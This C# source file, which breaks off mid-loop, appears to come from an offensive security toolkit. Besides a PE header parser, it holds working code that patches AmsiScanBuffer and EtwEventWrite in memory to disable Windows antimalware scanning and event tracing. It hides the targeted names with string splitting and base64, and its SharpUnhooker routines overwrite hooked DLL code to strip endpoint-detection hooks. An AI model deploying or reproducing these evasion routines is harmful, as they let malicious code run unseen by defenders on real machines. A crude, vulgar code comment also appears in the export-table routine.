using System;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;

public class PEReader
{
    public struct IMAGE_DOS_HEADER
    {      // DOS .EXE header
        public UInt16 e_magic;              // Magic number
        public UInt16 e_cblp;               // Bytes on last page of file
        public UInt16 e_cp;                 // Pages in file
        public UInt16 e_crlc;               // Relocations
        public UInt16 e_cparhdr;            // Size of header in paragraphs
        public UInt16 e_minalloc;           // Minimum extra paragraphs needed
        public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
        public UInt16 e_ss;                 // Initial (relative) SS value
        public UInt16 e_sp;                 // Initial SP value
        public UInt16 e_csum;               // Checksum
        public UInt16 e_ip;                 // Initial IP value
        public UInt16 e_cs;                 // Initial (relative) CS value
        public UInt16 e_lfarlc;             // File address of relocation table
        public UInt16 e_ovno;               // Overlay number
        public UInt16 e_res_0;              // Reserved words
        public UInt16 e_res_1;              // Reserved words
        public UInt16 e_res_2;              // Reserved words
        public UInt16 e_res_3;              // Reserved words
        public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
        public UInt16 e_oeminfo;            // OEM information; e_oemid specific
        public UInt16 e_res2_0;             // Reserved words
        public UInt16 e_res2_1;             // Reserved words
        public UInt16 e_res2_2;             // Reserved words
        public UInt16 e_res2_3;             // Reserved words
        public UInt16 e_res2_4;             // Reserved words
        public UInt16 e_res2_5;             // Reserved words
        public UInt16 e_res2_6;             // Reserved words
        public UInt16 e_res2_7;             // Reserved words
        public UInt16 e_res2_8;             // Reserved words
        public UInt16 e_res2_9;             // Reserved words
        public UInt32 e_lfanew;             // File address of new exe header
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER32
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt32 BaseOfData;
        public UInt32 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt32 SizeOfStackReserve;
        public UInt32 SizeOfStackCommit;
        public UInt32 SizeOfHeapReserve;
        public UInt32 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt64 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt64 SizeOfStackReserve;
        public UInt64 SizeOfStackCommit;
        public UInt64 SizeOfHeapReserve;
        public UInt64 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;
        [FieldOffset(8)]
        public UInt32 VirtualSize;
        [FieldOffset(12)]
        public UInt32 VirtualAddress;
        [FieldOffset(16)]
        public UInt32 SizeOfRawData;
        [FieldOffset(20)]
        public UInt32 PointerToRawData;
        [FieldOffset(24)]
        public UInt32 PointerToRelocations;
        [FieldOffset(28)]
        public UInt32 PointerToLinenumbers;
        [FieldOffset(32)]
        public UInt16 NumberOfRelocations;
        [FieldOffset(34)]
        public UInt16 NumberOfLinenumbers;
        [FieldOffset(36)]
        public DataSectionFlags Characteristics;

        public string Section
        {
            get { 
                int i = Name.Length - 1;
                while (Name[i] == 0) {
                    --i;
                }
                char[] NameCleaned = new char[i+1];
                Array.Copy(Name, NameCleaned, i+1);
                return new string(NameCleaned); 
            }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_BASE_RELOCATION
    {
        public uint VirtualAdress;
        public uint SizeOfBlock;
    }

    [Flags]
    public enum DataSectionFlags : uint
    {

        Stub = 0x00000000,

    }


    /// The DOS header

    private IMAGE_DOS_HEADER dosHeader;

    /// The file header

    private IMAGE_FILE_HEADER fileHeader;

    /// Optional 32 bit file header 

    private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

    /// Optional 64 bit file header 

    private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

    /// Image Section headers. Number of sections is in the file header.

    private IMAGE_SECTION_HEADER[] imageSectionHeaders;

    private byte[] rawbytes;



    public PEReader(string filePath)
    {
        // Read in the DLL or EXE and get the timestamp
        using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = System.IO.File.ReadAllBytes(filePath);

        }
    }

    public PEReader(byte[] fileBytes)
    {
        // Read in the DLL or EXE and get the timestamp
        using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = fileBytes;

        }
    }


    public static T FromBinaryReader<T>(BinaryReader reader)
    {
        // Read in a byte array
        byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

        // Pin the managed memory while, copy it out the data, then unpin it
        GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
        T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
        handle.Free();

        return theStructure;
    }



    public bool Is32BitHeader
    {
        get
        {
            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }
    }


    public IMAGE_FILE_HEADER FileHeader
    {
        get
        {
            return fileHeader;
        }
    }


    /// Gets the optional header

    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
    {
        get
        {
            return optionalHeader32;
        }
    }


    /// Gets the optional header

    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
    {
        get
        {
            return optionalHeader64;
        }
    }

    public IMAGE_SECTION_HEADER[] ImageSectionHeaders
    {
        get
        {
            return imageSectionHeaders;
        }
    }

    public byte[] RawBytes
    {
        get
        {
            return rawbytes;
        }

    }

}

public class Dynavoke {
    // Delegate NtProtectVirtualMemory
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtProtectVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        UInt32 NewProtect,
        ref UInt32 OldProtect);

    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
        IntPtr FunctionPtr = IntPtr.Zero;
        try {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }
            else {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++) {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        // will return IntPtr.Zero if not found!
        return FunctionPtr;
    }

    public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect) {
        // Craft an array for the arguments
        OldProtect = 0;
        object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };

        // get NtProtectVirtualMemory's pointer
        IntPtr NTDLLHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
        IntPtr pNTPVM = GetExportAddress(NTDLLHandleInMemory, "NtProtectVirtualMemory");
        // dynamicly invoke NtProtectVirtualMemory
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(pNTPVM, typeof(NtProtectVirtualMemoryDelegate));
        UInt32 NTSTATUSResult = (UInt32)funcDelegate.DynamicInvoke(funcargs);

        if (NTSTATUSResult != 0x00000000) {
            return false;
        }
        OldProtect = (UInt32)funcargs[4];
        return true;
    }
}

public class PatchAMSIAndETW {

    // Thx D/Invoke!
    private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
        IntPtr FunctionPtr = IntPtr.Zero;
        try {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }
            else {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++) {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        // will return IntPtr.Zero if not found!
        return FunctionPtr;
    }

	private static void PatchETW() {
		try {
            IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
			IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
			byte[] patchbyte = new byte[0];
            if (IntPtr.Size == 4) {
                string patchbytestring2 = "33,c0,c2,14,00";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }else {
                string patchbytestring2 = "48,33,C0,C3";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }
            IntPtr funcPtr = GetExportAddress(libPtr, ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
            IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
            UInt32 oldProtect = 0;
            Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
            Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
            UInt32 newProtect = 0;
            Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
            Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("WysrK10gRVRXIFNVQ0NFU1NGVUxMWSBQQVRDSEVEIQ==")));
		}catch (Exception e) {
			Console.WriteLine("[-] {0}", e.Message);
			Console.WriteLine("[-] {0}", e.InnerException);
		}
	}

    private static void PatchAMSI() {
        try {
            IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
            byte[] patchbyte = new byte[0];
            if (IntPtr.Size == 4) {
                string patchbytestring2 = "B8,57,00,07,80,C2,18,00";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }else {
                string patchbytestring2 = "B8,57,00,07,80,C3";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }
            IntPtr libPtr;
            try{ libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => (System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("YW1zaS5kbGw="))).Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch{ libPtr = IntPtr.Zero; }
            if (libPtr != IntPtr.Zero) {
                IntPtr funcPtr = GetExportAddress(libPtr, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
                IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
                UInt32 oldProtect = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
                UInt32 newProtect = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
                Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("WysrK10gQU1TSSBTVUNDRVNTRlVMTFkgUEFUQ0hFRCE=")));
            }else {
                Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("Wy1dIEFNU0kuRExMIElTIE5PVCBERVRFQ1RFRCE=")));
            }
        }catch (Exception e) {
            Console.WriteLine("[-] {0}", e.Message);
            Console.WriteLine("[-] {0}", e.InnerException);
        }
    }

    public static void Run() {
        PatchAMSI();
        PatchETW();
    }
}

public class SharpUnhooker {

    public static string[] BlacklistedFunction = {"EnterCriticalSection","LeaveCriticalSection","DeleteCriticalSection","InitializeSListHead","HeapAlloc","HeapReAlloc","HeapSize"};

    public static bool IsBlacklistedFunction(string FuncName) {
        for (int i = 0; i < BlacklistedFunction.Length; i++) {
            if (String.Equals(FuncName, BlacklistedFunction[i], StringComparison.OrdinalIgnoreCase)) {
                return true;
            }
        }
        return false;
    }

    public static void Copy(ref byte[] source, int sourceStartIndex, ref byte[] destination, int destinationStartIndex, int length) {
        if (source == null || source.Length == 0 || destination == null || destination.Length == 0 || length == 0) {
            throw new ArgumentNullException("Exception : One or more of the arguments are zero/null!");
        }
        if (length > destination.Length) {
            throw new ArgumentOutOfRangeException("Exception : length exceeds the size of source bytes!");
        }
        if ((sourceStartIndex + length) > source.Length) {
            throw new ArgumentOutOfRangeException("Exception : sourceStartIndex and length exceeds the size of source bytes!");
        }
        if ((destinationStartIndex + length) > destination.Length) {
            throw new ArgumentOutOfRangeException("Exception : destinationStartIndex and length exceeds the size of destination bytes!");
        }
        int targetIndex = destinationStartIndex;
        for (int sourceIndex = sourceStartIndex; sourceIndex < (sourceStartIndex + length); sourceIndex++) {
            destination[targetIndex] = source[sourceIndex];
            targetIndex++;
        }
    }

    public static bool JMPUnhooker(string DLLname) {
        // get the file path of the module
        string ModuleFullPath = String.Empty;
        try { ModuleFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName); }catch{ ModuleFullPath = null; }
        if (ModuleFullPath == null) {
            Console.WriteLine("[*] Module is not loaded,Skipping...");
            return true;
        }

        // read and parse the module, and then get the .TEXT section header
        byte[] ModuleBytes = File.ReadAllBytes(ModuleFullPath);
        PEReader OriginalModule = new PEReader(ModuleBytes);
        int TextSectionNumber = 0;
        for (int i = 0; i < OriginalModule.FileHeader.NumberOfSections; i++) {
            if (String.Equals(OriginalModule.ImageSectionHeaders[i].Section, ".text", StringComparison.OrdinalIgnoreCase)) {
                TextSectionNumber = i;
                break;
            }
        }

        // copy the original .TEXT section
        IntPtr TextSectionSize = new IntPtr(OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualSize);
        byte[] OriginalTextSectionBytes = new byte[(int)TextSectionSize];
        Copy(ref ModuleBytes, (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].PointerToRawData, ref OriginalTextSectionBytes, 0, (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualSize);

        // get the module base address and the .TEXT section address
        IntPtr ModuleBaseAddress = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
        IntPtr ModuleTextSectionAddress = ModuleBaseAddress + (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualAddress;

        // change memory protection to RWX
        UInt32 oldProtect = 0;
        bool updateMemoryProtection = Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, 0x40, ref oldProtect);
        if (!updateMemoryProtection) {
            Console.WriteLine("[-] Failed to change memory protection to RWX!");
            return false;
        }
        // apply the patch (the original .TEXT section)
        bool PatchApplied = true;
        try{ Marshal.Copy(OriginalTextSectionBytes, 0, ModuleTextSectionAddress, OriginalTextSectionBytes.Length); }catch{ PatchApplied = false; }
        if (!PatchApplied) {
            Console.WriteLine("[-] Failed to replace the .text section of the module!");
            return false;
        }
        // revert the memory protection
        UInt32 newProtect = 0;
        Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, oldProtect, ref newProtect);
        // done!
        Console.WriteLine("[+++] {0} IS UNHOOKED!", DLLname.ToUpper());
        return true;
    }

    public static void EATUnhooker(string ModuleName) {
        IntPtr ModuleBase = IntPtr.Zero;
        try { ModuleBase = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch {}
        if (ModuleBase == IntPtr.Zero) {
            Console.WriteLine("[-] Module is not loaded,Skipping...");
            return;
        }
        string ModuleFileName = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
        byte[] ModuleRawByte = System.IO.File.ReadAllBytes(ModuleFileName);

        // Traverse the PE header in memory
        Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
        Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
        Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
        Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
        Int64 pExport = 0;
        if (Magic == 0x010b) {
            pExport = OptHeader + 0x60;
        }
        else {
            pExport = OptHeader + 0x70;
        }

        // prepare module clone
        PEReader DiskModuleParsed = new PEReader(ModuleRawByte);
        int RegionSize = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfImage : (int)DiskModuleParsed.OptionalHeader64.SizeOfImage;
        int SizeOfHeaders = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfHeaders : (int)DiskModuleParsed.OptionalHeader64.SizeOfHeaders;
        IntPtr OriginalModuleBase = Marshal.AllocHGlobal(RegionSize);
        Marshal.Copy(ModuleRawByte, 0, OriginalModuleBase, SizeOfHeaders);
        for (int i = 0; i < DiskModuleParsed.FileHeader.NumberOfSections; i++) {
            IntPtr pVASectionBase = (IntPtr)((UInt64)OriginalModuleBase + DiskModuleParsed.ImageSectionHeaders[i].VirtualAddress);
            Marshal.Copy(ModuleRawByte, (int)DiskModuleParsed.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)DiskModuleParsed.ImageSectionHeaders[i].SizeOfRawData);
        }

        // Read -> IMAGE_EXPORT_DIRECTORY
        Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
        if (ExportRVA == 0) {
            Console.WriteLine("[-] Module doesnt have any exports, skipping...");
            return;
        }
        Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
        Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
        Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
        Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
        Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
        Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
        Int32 FunctionsRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + ExportRVA + 0x1C));

        // eat my cock u fokin user32.dll
        IntPtr TargetPtr = ModuleBase + FunctionsRVA;
        IntPtr TargetSize = (IntPtr)(4 * NumberOfFunctions);
        uint oldProtect = 0;
        if (!Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, 0x04, ref oldProtect)) {
            Console.WriteLine("[-] Failed to change EAT's memory protection to RW!");
            return;
        }

        // Loop the array of export RVA's
        for (int i = 0; i < NumberOfFunctions; i++) {
            string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
            Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
            Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
